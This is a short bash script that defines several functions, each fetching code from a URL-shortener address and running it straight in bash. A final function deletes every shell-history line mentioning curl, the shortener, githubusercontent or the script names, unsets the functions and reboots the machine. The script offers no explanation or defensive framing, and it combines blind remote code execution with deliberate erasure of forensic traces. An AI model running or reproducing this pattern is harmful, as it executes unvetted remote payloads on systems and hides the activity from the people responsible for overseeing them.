#!/bin/bash

z1() { bash <(curl -sL https://clck.ru); }
z2() { bash <(curl -sL https://clck.ru); }
z3() { bash <(curl -sL https://clck.ru); }
z4() { bash <(curl -sL https://clck.ru); }
z5() { bash <(curl -sL https://clck.ru); }
z6() { bash <(curl -sL https://clck.ru); }
z7() { bash <(curl -sL https://clck.ru); }
z9() { bash <(curl -sL https://clck.ru); }

zx() {
    local hf="${HISTFILE:-$HOME/.bash_history}"
    history -a
    if [ -f "$hf" ]; then
        sed -i -E '/(curl|clck\.ru|githubusercontent|ini\.sh)/d' "$hf"
        sed -i -E '/^z([1-9]|x)[[:space:]]*$/d' "$hf"
    fi
    
    unset -f z1 z2 z3 z4 z5 z6 z7 z9 zx
    history -c
    history -r "$hf"
    sync
    reboot
}

clear
echo "Done: z1..z7, z9 | Final: zx"
